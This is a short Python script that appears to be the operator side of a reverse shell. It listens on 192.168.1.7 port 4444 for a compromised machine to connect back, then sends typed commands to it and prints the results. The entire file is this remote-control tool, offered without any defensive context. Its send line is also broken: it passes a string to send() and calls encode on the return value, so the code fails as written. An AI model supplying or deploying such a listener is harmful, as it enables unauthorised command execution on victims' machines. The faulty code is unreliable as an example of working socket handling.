#!/usr/bin/python3
import socket

listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listner.bind(("192.168.1.7",4444))
listner.listen(0)
print("[+] Waiting for incomming connections")
conn,addr = listner.accept()
print("[+] Got a connection from" + str(addr) )

while(True):
    command = input(">> ")
    conn.send(command).encode('ascii')
    result = conn.recv(1024)
    print(result)
    